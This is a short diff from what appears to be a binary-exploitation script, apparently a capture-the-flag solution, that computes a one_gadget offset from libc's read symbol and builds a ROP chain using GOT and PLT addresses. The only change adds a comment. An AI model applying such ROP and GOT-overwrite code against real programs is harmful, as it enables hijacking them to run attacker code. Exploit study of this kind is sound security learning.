@@ -46,7 +46,7 @@ offset = one_gadget - libc.sym['read']
 offset = 2**32 + offset
 print(hex(offset))
 
-read_got = elf.got['read']
+read_got = elf.got['read']  #libc_base + libc.sym['read']
 read_plt = elf.sym['read']
 
 rop_chain = p64(0x004011b2) + p64(offset) + p64(read_got+0x3d) + p64(0)*4
